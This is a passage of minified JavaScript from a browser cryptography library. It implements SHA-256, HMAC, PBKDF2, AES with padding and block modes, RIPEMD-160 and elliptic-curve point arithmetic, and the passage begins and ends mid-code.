        for (var t = [], o = 0, r = 0; o < e.length; r = ++o % 4) 0 != r && t.push(("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".indexOf(e.charAt(o - 1)) & Math.pow(2, -2 * r + 8) - 1) << 2 * r | "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".indexOf(e.charAt(o)) >>> 6 - 2 * r);
        return t
      }
    },
    o = e.charenc = {},
    i = (o.UTF8 = {
      stringToBytes: function(e) {
        return i.stringToBytes(unescape(encodeURIComponent(e)))
      },
      bytesToString: function(e) {
        return decodeURIComponent(escape(i.bytesToString(e)))
      }
    }, o.Binary = {
      stringToBytes: function(e) {
        for (var t = [], o = 0; o < e.length; o++) t.push(255 & e.charCodeAt(o));
        return t
      },
      bytesToString: function(e) {
        for (var t = [], o = 0; o < e.length; o++) t.push(String.fromCharCode(e[o]));
        return t.join("")
      }
    })
}(),
function() {
  var e = Crypto,
    t = e.util,
    o = e.charenc,
    r = o.UTF8,
    i = o.Binary,
    s = [1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298],
    n = e.SHA256 = function(e, o) {
      var r = t.wordsToBytes(n._sha256(e));
      return o && o.asBytes ? r : o && o.asString ? i.bytesToString(r) : t.bytesToHex(r)
    };
  n._sha256 = function(n) {
    n.constructor == String && (n = r.stringToBytes(n));
    var p, d, u, B, v, A, P, x, K, H, N, z, L = t.bytesToWords(n),
      m = 8 * n.length,
      l = [1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225],
      T = [];
    L[m >> 5] |= 128 << 24 - m % 32, L[(m + 64 >> 9 << 4) + 15] = m;
    for (var K = 0; K < L.length; K += 16) {
      p = l[0], d = l[1], u = l[2], B = l[3], v = l[4], A = l[5], P = l[6], x = l[7];
      for (var H = 0; 64 > H; H++) {
        if (16 > H) T[H] = L[H + K];
        else {
          var I = T[H - 15],
            E = T[H - 2];
          T[H] = ((I << 25 | I >>> 7) ^ (I << 14 | I >>> 18) ^ I >>> 3) + (T[H - 7] >>> 0) + ((E << 15 | E >>> 17) ^ (E << 13 | E >>> 19) ^ E >>> 10) + (T[H - 16] >>> 0)
        }
        var S = v & A ^ ~v & P,
          D = p & d ^ p & u ^ d & u,
          q = (p << 30 | p >>> 2) ^ (p << 19 | p >>> 13) ^ (p << 10 | p >>> 22),
          U = (v << 26 | v >>> 6) ^ (v << 21 | v >>> 11) ^ (v << 7 | v >>> 25);
        N = (x >>> 0) + U + S + s[H] + (T[H] >>> 0), z = q + D, x = P, P = A, A = v, v = B + N >>> 0, B = u, u = d, d = p, p = N + z >>> 0
      }
      l[0] += p, l[1] += d, l[2] += u, l[3] += B, l[4] += v, l[5] += A, l[6] += P, l[7] += x
    }
    return l
  }, n._blocksize = 16, n._digestsize = 32
}(),
function() {
  var e = Crypto,
    t = e.util,
    o = e.charenc,
    r = o.UTF8,
    s = o.Binary;
  e.PBKDF2 = function(o, n, p, a) {
    function d(t, o) {
      return e.HMAC(l, o, t, {
        asBytes: !0
      })
    }
    o.constructor == String && (o = r.stringToBytes(o)), n.constructor == String && (n = r.stringToBytes(n));
    for (var l = a && a.hasher || e.SHA1, u = a && a.iterations || 1, y = [], c = 1; y.length < p;) {
      for (var m = d(o, n.concat(t.wordsToBytes([c]))), g = m, h = 1; u > h; h++) {
        g = d(o, g);
        for (var b = 0; b < m.length; b++) m[b] ^= g[b]
      }
      y = y.concat(m), c++
    }
    return y.length = p, a && a.asBytes ? y : a && a.asString ? s.bytesToString(y) : t.bytesToHex(y)
  }
}(),
function() {
  var e = Crypto,
    t = e.util,
    o = e.charenc,
    r = o.UTF8,
    s = o.Binary;
  e.HMAC = function(e, o, n, p) {
    o.constructor == String && (o = r.stringToBytes(o)), n.constructor == String && (n = r.stringToBytes(n)), n.length > 4 * e._blocksize && (n = e(n, {
      asBytes: !0
    }));
    for (var a = n.slice(0), d = n.slice(0), l = 0; l < 4 * e._blocksize; l++) a[l] ^= 92, d[l] ^= 54;
    var u = e(a.concat(e(d.concat(o), {
      asBytes: !0
    })), {
      asBytes: !0
    });
    return p && p.asBytes ? u : p && p.asString ? s.bytesToString(u) : t.bytesToHex(u)
  }
}(),
function() {
  function e(e, t) {
    for (var r = 0, s = 0; 8 > s; s++) {
      1 & t && (r ^= e);
      var n = 128 & e;
      e = 255 & e << 1, n && (e ^= 27), t >>>= 1
    }
    return r
  }
  for (var t = Crypto, r = t.util, o = t.charenc, s = o.UTF8, n = [99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118, 202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22], p = [], a = 0; 256 > a; a++) p[n[a]] = a;
  for (var d = [], l = [], u = [], c = [], m = [], g = [], a = 0; 256 > a; a++) d[a] = e(a, 2), l[a] = e(a, 3), u[a] = e(a, 9), c[a] = e(a, 11), m[a] = e(a, 13), g[a] = e(a, 14);
  var y, h, b, B = [0, 1, 2, 4, 8, 16, 32, 64, 128, 27, 54],
    A = [
      [],
      [],
      [],
      []
    ],
    F = t.AES = {
      encrypt: function(e, o, i) {
        i = i || {};
        var n = i.mode || new t.mode.OFB;
        n.fixOptions && n.fixOptions(i);
        var p = e.constructor == String ? s.stringToBytes(e) : e,
          a = i.iv || r.randomBytes(4 * F._blocksize),
          d = o.constructor == String ? t.PBKDF2(o, a, 32, {
            asBytes: !0
          }) : o;
        return F._init(d), n.encrypt(F, p, a), p = i.iv ? p : a.concat(p), i && i.asBytes ? p : r.bytesToBase64(p)
      },
      decrypt: function(e, o, i) {
        i = i || {};
        var n = i.mode || new t.mode.OFB;
        n.fixOptions && n.fixOptions(i);
        var p = e.constructor == String ? r.base64ToBytes(e) : e,
          a = i.iv || p.splice(0, 4 * F._blocksize),
          d = o.constructor == String ? t.PBKDF2(o, a, 32, {
            asBytes: !0
          }) : o;
        return F._init(d), n.decrypt(F, p, a), i && i.asBytes ? p : s.bytesToString(p)
      },
      _blocksize: 4,
      _encryptblock: function(e, t) {
        for (var o = 0; o < F._blocksize; o++)
          for (var i = 0; 4 > i; i++) A[o][i] = e[t + 4 * i + o];
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] ^= b[i][o];
        for (var r = 1; h > r; r++) {
          for (var o = 0; 4 > o; o++)
            for (var i = 0; 4 > i; i++) A[o][i] = n[A[o][i]];
          A[1].push(A[1].shift()), A[2].push(A[2].shift()), A[2].push(A[2].shift()), A[3].unshift(A[3].pop());
          for (var i = 0; 4 > i; i++) {
            var s = A[0][i],
              p = A[1][i],
              a = A[2][i],
              y = A[3][i];
            A[0][i] = d[s] ^ l[p] ^ a ^ y, A[1][i] = s ^ d[p] ^ l[a] ^ y, A[2][i] = s ^ p ^ d[a] ^ l[y], A[3][i] = l[s] ^ p ^ a ^ d[y]
          }
          for (var o = 0; 4 > o; o++)
            for (var i = 0; 4 > i; i++) A[o][i] ^= b[4 * r + i][o]
        }
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] = n[A[o][i]];
        A[1].push(A[1].shift()), A[2].push(A[2].shift()), A[2].push(A[2].shift()), A[3].unshift(A[3].pop());
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] ^= b[4 * h + i][o];
        for (var o = 0; o < F._blocksize; o++)
          for (var i = 0; 4 > i; i++) e[t + 4 * i + o] = A[o][i]
      },
      _decryptblock: function(e, t) {
        for (var o = 0; o < F._blocksize; o++)
          for (var i = 0; 4 > i; i++) A[o][i] = e[t + 4 * i + o];
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] ^= b[4 * h + i][o];
        for (var r = 1; h > r; r++) {
          A[1].unshift(A[1].pop()), A[2].push(A[2].shift()), A[2].push(A[2].shift()), A[3].push(A[3].shift());
          for (var o = 0; 4 > o; o++)
            for (var i = 0; 4 > i; i++) A[o][i] = p[A[o][i]];
          for (var o = 0; 4 > o; o++)
            for (var i = 0; 4 > i; i++) A[o][i] ^= b[4 * (h - r) + i][o];
          for (var i = 0; 4 > i; i++) {
            var s = A[0][i],
              n = A[1][i],
              a = A[2][i],
              l = A[3][i];
            A[0][i] = g[s] ^ c[n] ^ m[a] ^ u[l], A[1][i] = u[s] ^ g[n] ^ c[a] ^ m[l], A[2][i] = m[s] ^ u[n] ^ g[a] ^ c[l], A[3][i] = c[s] ^ m[n] ^ u[a] ^ g[l]
          }
        }
        A[1].unshift(A[1].pop()), A[2].push(A[2].shift()), A[2].push(A[2].shift()), A[3].push(A[3].shift());
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] = p[A[o][i]];
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] ^= b[i][o];
        for (var o = 0; o < F._blocksize; o++)
          for (var i = 0; 4 > i; i++) e[t + 4 * i + o] = A[o][i]
      },
      _init: function(e) {
        y = e.length / 4, h = y + 6, F._keyexpansion(e)
      },
      _keyexpansion: function(e) {
        b = [];
        for (var t = 0; y > t; t++) b[t] = [e[4 * t], e[4 * t + 1], e[4 * t + 2], e[4 * t + 3]];
        for (var o, t = y; t < F._blocksize * (h + 1); t++) o = [b[t - 1][0], b[t - 1][1], b[t - 1][2], b[t - 1][3]], 0 == t % y ? (o.push(o.shift()), o[0] = n[o[0]], o[1] = n[o[1]], o[2] = n[o[2]], o[3] = n[o[3]], o[0] ^= B[t / y]) : 6 < y && 4 == t % y && (o[0] = n[o[0]], o[1] = n[o[1]], o[2] = n[o[2]], o[3] = n[o[3]]), b[t] = [b[t - y][0] ^ o[0], b[t - y][1] ^ o[1], b[t - y][2] ^ o[2], b[t - y][3] ^ o[3]]
      }
    }
}(),
function(e) {
  function t(e, t) {
    var o = 4 * e._blocksize,
      i = o - t.length % o;
    return i
  }
  var o = e.pad = {},
    i = function(e, t, o, r) {
      var s = t.pop();
      if (0 == s) throw new Error("Invalid zero-length padding specified for " + o + ". Wrong cipher specification or key used?");
      var n = 4 * e._blocksize;
      if (s > n) throw new Error("Invalid padding length of " + s + " specified for " + o + ". Wrong cipher specification or key used?");
      for (var p, a = 1; s > a; a++)
        if (p = t.pop(), null != r && r != p) throw new Error("Invalid padding byte of 0x" + p.toString(16) + " specified for " + o + ". Wrong cipher specification or key used?")
    };
  o.NoPadding = {
    pad: function() {},
    unpad: function() {}
  }, o.ZeroPadding = {
    pad: function(e, t) {
      var o = 4 * e._blocksize,
        i = t.length % o;
      if (0 != i)
        for (i = o - i; 0 < i; i--) t.push(0)
    },
    unpad: function(e, t) {
      for (; 0 == t[t.length - 1];) t.pop()
    }
  }, o.iso7816 = {
    pad: function(e, o) {
      var i = t(e, o);
      for (o.push(128); 1 < i; i--) o.push(0)
    },
    unpad: function(e, t) {
      var o;
      for (o = 4 * e._blocksize; 0 < o; o--) {
        var i = t.pop();
        if (128 == i) return;
        if (0 != i) throw new Error("ISO-7816 padding byte must be 0, not 0x" + i.toString(16) + ". Wrong cipher specification or key used?")
      }
      throw new Error("ISO-7816 padded beyond cipher block size. Wrong cipher specification or key used?")
    }
  }, o.ansix923 = {
    pad: function(e, o) {
      for (var r = t(e, o), s = 1; r > s; s++) o.push(0);
      o.push(r)
    },
    unpad: function(e, t) {
      i(e, t, "ANSI X.923", 0)
    }
  }, o.iso10126 = {
    pad: function(e, o) {
      for (var r = t(e, o), s = 1; r > s; s++) o.push(Math.floor(256 * Math.random()));
      o.push(r)
    },
    unpad: function(e, t) {
      i(e, t, "ISO 10126", void 0)
    }
  }, o.pkcs7 = {
    pad: function(e, o) {
      for (var r = t(e, o), s = 0; r > s; s++) o.push(r)
    },
    unpad: function(e, t) {
      i(e, t, "PKCS 7", t[t.length - 1])
    }
  };
  var r = e.mode = {},
    s = r.Mode = function(e) {
      e && (this._padding = e)
    };
  s.prototype = {
    encrypt: function(e, t, o) {
      this._padding.pad(e, t), this._doEncrypt(e, t, o)
    },
    decrypt: function(e, t, o) {
      this._doDecrypt(e, t, o), this._padding.unpad(e, t)
    },
    _padding: o.iso7816
  };
  var n = r.ECB = function() {
      s.apply(this, arguments)
    },
    p = n.prototype = new s;
  p._doEncrypt = function(e, t) {
    for (var o = 4 * e._blocksize, i = 0; i < t.length; i += o) e._encryptblock(t, i)
  }, p._doDecrypt = function(e, t) {
    for (var o = 4 * e._blocksize, i = 0; i < t.length; i += o) e._decryptblock(t, i)
  }, p.fixOptions = function(e) {
    e.iv = []
  };
  var a = r.CBC = function() {
      s.apply(this, arguments)
    },
    d = a.prototype = new s;
  d._doEncrypt = function(e, t, o) {
    for (var r = 4 * e._blocksize, s = 0; s < t.length; s += r) {
      if (0 == s)
        for (var n = 0; r > n; n++) t[n] ^= o[n];
      else
        for (var n = 0; r > n; n++) t[s + n] ^= t[s + n - r];
      e._encryptblock(t, s)
    }
  }, d._doDecrypt = function(e, t, o) {
    for (var r, s = 4 * e._blocksize, n = o, p = 0; p < t.length; p += s) {
      r = t.slice(p, p + s), e._decryptblock(t, p);
      for (var a = 0; s > a; a++) t[p + a] ^= n[a];
      n = r
    }
  };
  var l = r.CFB = function() {
      s.apply(this, arguments)
    },
    u = l.prototype = new s;
  u._padding = o.NoPadding, u._doEncrypt = function(e, t, o) {
    for (var r, s = 4 * e._blocksize, n = o.slice(0), p = 0; p < t.length; p++) r = p % s, 0 == r && e._encryptblock(n, 0), t[p] ^= n[r], n[r] = t[p]
  }, u._doDecrypt = function(e, t, o) {
    for (var r, s = 4 * e._blocksize, n = o.slice(0), p = 0; p < t.length; p++) {
      r = p % s, 0 == r && e._encryptblock(n, 0);
      var a = t[p];
      t[p] ^= n[r], n[r] = a
    }
  };
  var y = r.OFB = function() {
      s.apply(this, arguments)
    },
    c = y.prototype = new s;
  c._padding = o.NoPadding, c._doEncrypt = function(e, t, o) {
    for (var r = 4 * e._blocksize, s = o.slice(0), n = 0; n < t.length; n++) 0 == n % r && e._encryptblock(s, 0), t[n] ^= s[n % r]
  }, c._doDecrypt = c._doEncrypt;
  var m = r.CTR = function() {
      s.apply(this, arguments)
    },
    g = m.prototype = new s;
  g._padding = o.NoPadding, g._doEncrypt = function(e, t, o) {
    for (var r, s = 4 * e._blocksize, n = o.slice(0), p = 0; p < t.length;) {
      r = n.slice(0), e._encryptblock(r, 0);
      for (var a = 0; p < t.length && s > a; a++, p++) t[p] ^= r[a];
      256 == ++n[s - 1] && (n[s - 1] = 0, 256 == ++n[s - 2] && (n[s - 2] = 0, 256 == ++n[s - 3] && (n[s - 3] = 0, ++n[s - 4])))
    }
  }, g._doDecrypt = g._doEncrypt
}(Crypto),
function() {
  function e(e, t, o, i) {
    return 0 <= e && 15 >= e ? t ^ o ^ i : 16 <= e && 31 >= e ? t & o | ~t & i : 32 <= e && 47 >= e ? (t | ~o) ^ i : 48 <= e && 63 >= e ? t & i | o & ~i : 64 <= e && 79 >= e ? t ^ (o | ~i) : "rmd160_f: j out of range"
  }

  function t(e) {
    return 0 <= e && 15 >= e ? 0 : 16 <= e && 31 >= e ? 1518500249 : 32 <= e && 47 >= e ? 1859775393 : 48 <= e && 63 >= e ? 2400959708 : 64 <= e && 79 >= e ? 2840853838 : "rmd160_K1: j out of range"
  }

  function o(e) {
    return 0 <= e && 15 >= e ? 1352829926 : 16 <= e && 31 >= e ? 1548603684 : 32 <= e && 47 >= e ? 1836072691 : 48 <= e && 63 >= e ? 2053994217 : 64 <= e && 79 >= e ? 0 : "rmd160_K2: j out of range"
  }

  function r(e, t) {
    var o = (65535 & e) + (65535 & t);
    return (e >> 16) + (t >> 16) + (o >> 16) << 16 | 65535 & o
  }

  function s(e, t) {
    return e << t | e >>> 32 - t
  }
  var i = Crypto,
    n = i.util,
    p = i.charenc,
    a = p.UTF8,
    d = p.Binary;
  n.bytesToLWords = function(e) {
    for (var t = Array(e.length >> 2), o = 0; o < t.length; o++) t[o] = 0;
    for (var o = 0; o < 8 * e.length; o += 8) t[o >> 5] |= (255 & e[o / 8]) << o % 32;
    return t
  }, n.lWordsToBytes = function(e) {
    for (var t = [], o = 0; o < 32 * e.length; o += 8) t.push(255 & e[o >> 5] >>> o % 32);
    return t
  };
  var l = i.RIPEMD160 = function(e, t) {
    var o = n.lWordsToBytes(l._rmd160(e));
    return t && t.asBytes ? o : t && t.asString ? d.bytesToString(o) : n.bytesToHex(o)
  };
  l._rmd160 = function(p) {
    p.constructor == String && (p = a.stringToBytes(p));
    var d = n.bytesToLWords(p),
      l = 8 * p.length;
    d[l >> 5] |= 128 << l % 32, d[(l + 64 >>> 9 << 4) + 14] = l;
    for (var g = 1732584193, f = 4023233417, h = 2562383102, b = 271733878, B = 3285377520, F = 0; F < d.length; F += 16) {
      for (var S, C = g, A = f, E = h, P = b, w = B, I = g, R = f, Z = h, Q = b, Y = B, G = 0; 79 >= G; ++G) S = r(C, e(G, A, E, P)), S = r(S, d[F + u[G]]), S = r(S, t(G)), S = r(s(S, c[G]), w), C = w, w = P, P = s(E, 10), E = A, A = S, S = r(I, e(79 - G, R, Z, Q)), S = r(S, d[F + y[G]]), S = r(S, o(G)), S = r(s(S, m[G]), Y), I = Y, Y = Q, Q = s(Z, 10), Z = R, R = S;
      S = r(f, r(E, Q)), f = r(h, r(P, Y)), h = r(b, r(w, I)), b = r(B, r(C, R)), B = r(g, r(A, Z)), g = S
    }
    return [g, f, h, b, B]
  };
  var u = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 7, 4, 13, 1, 10, 6, 15, 3, 12, 0, 9, 5, 2, 14, 11, 8, 3, 10, 14, 4, 9, 15, 8, 1, 2, 7, 0, 6, 13, 11, 5, 12, 1, 9, 11, 10, 0, 8, 12, 4, 13, 3, 7, 15, 14, 5, 6, 2, 4, 0, 5, 9, 7, 12, 2, 10, 14, 1, 3, 8, 11, 6, 15, 13],
    y = [5, 14, 7, 0, 9, 2, 11, 4, 13, 6, 15, 8, 1, 10, 3, 12, 6, 11, 3, 7, 0, 13, 5, 10, 14, 15, 8, 12, 4, 9, 1, 2, 15, 5, 1, 3, 7, 14, 6, 9, 11, 8, 12, 2, 10, 0, 4, 13, 8, 6, 4, 1, 3, 11, 15, 0, 5, 12, 2, 13, 9, 7, 10, 14, 12, 15, 10, 4, 1, 5, 8, 7, 6, 2, 13, 14, 0, 3, 9, 11],
    c = [11, 14, 15, 12, 5, 8, 7, 9, 11, 13, 14, 15, 6, 7, 9, 8, 7, 6, 8, 13, 11, 9, 7, 15, 7, 12, 15, 9, 11, 7, 13, 12, 11, 13, 6, 7, 14, 9, 13, 15, 14, 8, 13, 6, 5, 12, 7, 5, 11, 12, 14, 15, 14, 15, 9, 8, 9, 14, 5, 6, 8, 6, 5, 12, 9, 15, 5, 11, 6, 8, 13, 12, 5, 12, 13, 14, 11, 8, 5, 6],
    m = [8, 9, 9, 11, 13, 15, 15, 5, 7, 7, 8, 11, 14, 14, 12, 6, 9, 13, 15, 7, 12, 8, 9, 11, 7, 7, 12, 7, 6, 15, 13, 11, 9, 7, 15, 11, 8, 6, 6, 14, 12, 13, 5, 14, 13, 13, 7, 5, 15, 5, 8, 11, 14, 14, 6, 14, 6, 9, 12, 9, 12, 5, 15, 8, 8, 5, 12, 9, 12, 5, 14, 6, 8, 13, 6, 5, 15, 13, 11, 11]
}(),
function() {
  var e = window.EllipticCurve = function() {};
  e.FieldElementFp = function(e, t) {
    this.x = t, this.q = e
  }, e.FieldElementFp.prototype.equals = function(e) {
    return !(e != this) || this.q.equals(e.q) && this.x.equals(e.x)
  }, e.FieldElementFp.prototype.toBigInteger = function() {
    return this.x
  }, e.FieldElementFp.prototype.negate = function() {
    return new e.FieldElementFp(this.q, this.x.negate().mod(this.q))
  }, e.FieldElementFp.prototype.add = function(t) {
    return new e.FieldElementFp(this.q, this.x.add(t.toBigInteger()).mod(this.q))
  }, e.FieldElementFp.prototype.subtract = function(t) {
    return new e.FieldElementFp(this.q, this.x.subtract(t.toBigInteger()).mod(this.q))
  }, e.FieldElementFp.prototype.multiply = function(t) {
    return new e.FieldElementFp(this.q, this.x.multiply(t.toBigInteger()).mod(this.q))
  }, e.FieldElementFp.prototype.square = function() {
    return new e.FieldElementFp(this.q, this.x.square().mod(this.q))
  }, e.FieldElementFp.prototype.divide = function(t) {
    return new e.FieldElementFp(this.q, this.x.multiply(t.toBigInteger().modInverse(this.q)).mod(this.q))
  }, e.FieldElementFp.prototype.getByteLength = function() {
    return Math.floor((this.toBigInteger().bitLength() + 7) / 8)
  }, e.FieldElementFp.prototype.sqrt = function() {
    if (!this.q.testBit(0)) throw new Error("even value of q");
    if (this.q.testBit(1)) {
      var t = new e.FieldElementFp(this.q, this.x.modPow(this.q.shiftRight(2).add(BigInteger.ONE), this.q));
      return t.square().equals(this) ? t : null
    }
    var o = this.q.subtract(BigInteger.ONE),
      i = o.shiftRight(1);
    if (!this.x.modPow(i, this.q).equals(BigInteger.ONE)) return null;
    var r, s, n = o.shiftRight(2),
      p = n.shiftLeft(1).add(BigInteger.ONE),
      a = this.x,
      d = a.shiftLeft(2).mod(this.q);
    do {
      var l, u = new SecureRandom;
      do l = new BigInteger(this.q.bitLength(), u); while (0 <= l.compareTo(this.q) || !l.multiply(l).subtract(d).modPow(i, this.q).equals(o));
      var c = e.FieldElementFp.fastLucasSequence(this.q, l, a, p);
      if (r = c[0], s = c[1], s.multiply(s).mod(this.q).equals(d)) return s.testBit(0) && (s = s.add(this.q)), s = s.shiftRight(1), new e.FieldElementFp(this.q, s)
    } while (r.equals(BigInteger.ONE) || r.equals(o));
    return null
  }, e.FieldElementFp.fastLucasSequence = function(e, t, o, i) {
    for (var r = i.bitLength(), n = i.getLowestSetBit(), s = BigInteger.ONE, p = BigInteger.TWO, a = t, l = BigInteger.ONE, u = BigInteger.ONE, c = r - 1; c >= n + 1; --c) l = l.multiply(u).mod(e), i.testBit(c) ? (u = l.multiply(o).mod(e), s = s.multiply(a).mod(e), p = a.multiply(p).subtract(t.multiply(l)).mod(e), a = a.multiply(a).subtract(u.shiftLeft(1)).mod(e)) : (u = l, s = s.multiply(p).subtract(l).mod(e), a = a.multiply(p).subtract(t.multiply(l)).mod(e), p = p.multiply(p).subtract(l.shiftLeft(1)).mod(e));
    l = l.multiply(u).mod(e), u = l.multiply(o).mod(e), s = s.multiply(p).subtract(l).mod(e), p = a.multiply(p).subtract(t.multiply(l)).mod(e), l = l.multiply(u).mod(e);
    for (var c = 1; n >= c; ++c) s = s.multiply(p).mod(e), p = p.multiply(p).subtract(l.shiftLeft(1)).mod(e), l = l.multiply(l).mod(e);
    return [s, p]
  }, e.PointFp = function(e, t, o, i, r) {
    this.curve = e, this.x = t, this.y = o, this.z = null == i ? BigInteger.ONE : i, this.zinv = null, this.compressed = !!r
  }, e.PointFp.prototype.getX = function() {
    null == this.zinv && (this.zinv = this.z.modInverse(this.curve.q));
    var e = this.x.toBigInteger().multiply(this.zinv);
    return this.curve.reduce(e), this.curve.fromBigInteger(e)
  }, e.PointFp.prototype.getY = function() {
    null == this.zinv && (this.zinv = this.z.modInverse(this.curve.q));
    var e = this.y.toBigInteger().multiply(this.zinv);
    return this.curve.reduce(e), this.curve.fromBigInteger(e)
  }, e.PointFp.prototype.equals = function(e) {
    if (e == this) return !0;
    if (this.isInfinity()) return e.isInfinity();
    if (e.isInfinity()) return this.isInfinity();
    var t, o;
    return t = e.y.toBigInteger().multiply(this.z).subtract(this.y.toBigInteger().multiply(e.z)).mod(this.curve.q), !!t.equals(BigInteger.ZERO) && (o = e.x.toBigInteger().multiply(this.z).subtract(this.x.toBigInteger().multiply(e.z)).mod(this.curve.q), o.equals(BigInteger.ZERO))
  }, e.PointFp.prototype.isInfinity = function() {
    return !(null != this.x || null != this.y) || this.z.equals(BigInteger.ZERO) && !this.y.toBigInteger().equals(BigInteger.ZERO)
  }, e.PointFp.prototype.negate = function() {
    return new e.PointFp(this.curve, this.x, this.y.negate(), this.z)
  }, e.PointFp.prototype.add = function(t) {
    if (this.isInfinity()) return t;
    if (t.isInfinity()) return this;
    var o = t.y.toBigInteger().multiply(this.z).subtract(this.y.toBigInteger().multiply(t.z)).mod(this.curve.q),
      i = t.x.toBigInteger().multiply(this.z).subtract(this.x.toBigInteger().multiply(t.z)).mod(this.curve.q);
    if (BigInteger.ZERO.equals(i)) return BigInteger.ZERO.equals(o) ? this.twice() : this.curve.getInfinity();
    var r = new BigInteger("3"),
      s = this.x.toBigInteger(),
      n = this.y.toBigInteger(),
      p = (t.x.toBigInteger(), t.y.toBigInteger(), i.square()),
      a = p.multiply(i),
      d = s.multiply(p),
      l = o.square().multiply(this.z),
      u = l.subtract(d.shiftLeft(1)).multiply(t.z).subtract(a).multiply(i).mod(this.curve.q),
      y = d.multiply(r).multiply(o).subtract(n.multiply(a)).subtract(l.multiply(o)).multiply(t.z).add(o.multiply(a)).mod(this.curve.q),
      c = a.multiply(this.z).multiply(t.z).mod(this.curve.q);
    return new e.PointFp(this.curve, this.curve.fromBigInteger(u), this.curve.fromBigInteger(y), c)
  }, e.PointFp.prototype.twice = function() {
    if (this.isInfinity()) return this;
    if (0 == this.y.toBigInteger().signum()) return this.curve.getInfinity();
    var t = new BigInteger("3"),
      o = this.x.toBigInteger(),
      i = this.y.toBigInteger(),
      r = i.multiply(this.z),
      s = r.multiply(i).mod(this.curve.q),
      n = this.curve.a.toBigInteger(),
      p = o.square().multiply(t);
    BigInteger.ZERO.equals(n) || (p = p.add(this.z.square().multiply(n))), p = p.mod(this.curve.q);
    var a = p.square().subtract(o.shiftLeft(3).multiply(s)).shiftLeft(1).multiply(r).mod(this.curve.q),
      d = p.multiply(t).multiply(o).subtract(s.shiftLeft(1)).shiftLeft(2).multiply(s).subtract(p.square().multiply(p)).mod(this.curve.q),
      l = r.square().multiply(r).shiftLeft(3).mod(this.curve.q);
    return new e.PointFp(this.curve, this.curve.fromBigInteger(a), this.curve.fromBigInteger(d), l)
  }, e.PointFp.prototype.multiply = function(t) {
    if (this.isInfinity()) return this;
    if (0 == t.signum()) return this.curve.getInfinity();
    var o, r = t,
      e = r.multiply(new BigInteger("3")),
      s = this.negate(),
      n = this;
    for (o = e.bitLength() - 2; 0 < o; --o) {
      n = n.twice();
      var p = e.testBit(o),
        a = r.testBit(o);
      p != a && (n = n.add(p ? this : s))
    }
    return n
  }, e.PointFp.prototype.multiplyTwo = function(e, t, o) {
    var r = e.bitLength() > o.bitLength() ? e.bitLength() - 1 : o.bitLength() - 1;
    for (var s = this.curve.getInfinity(), n = this.add(t); 0 <= r;) s = s.twice(), e.testBit(r) ? s = s.add(o.testBit(r) ? n : this) : o.testBit(r) && (s = s.add(t)), --r;
    return s
  }, e.PointFp.prototype.getEncoded = function(t) {
    var o = this.getX().toBigInteger(),
      i = this.getY().toBigInteger(),
      r = e.integerToBytes(o, 32);
    return t ? r.unshift(i.isEven() ? 2 : 3) : (r.unshift(4), r = r.concat(e.integerToBytes(i, 32))), r
  }, e.PointFp.decodeFrom = function(t, o) {
    var i = (o[0], o.length - 1),
      r = o.slice(1, 1 + i / 2),
      s = o.slice(1 + i / 2, 1 + i);
    r.unshift(0), s.unshift(0);
    var n = new BigInteger(r),
      p = new BigInteger(s);
    return new e.PointFp(t, t.fromBigInteger(n), t.fromBigInteger(p))
  }, e.PointFp.prototype.add2D = function(t) {
    if (this.isInfinity()) return t;
    if (t.isInfinity()) return this;
    if (this.x.equals(t.x)) return this.y.equals(t.y) ? this.twice() : this.curve.getInfinity();
    var o = t.x.subtract(this.x),
      i = t.y.subtract(this.y),
      r = i.divide(o),
      s = r.square().subtract(this.x).subtract(t.x),
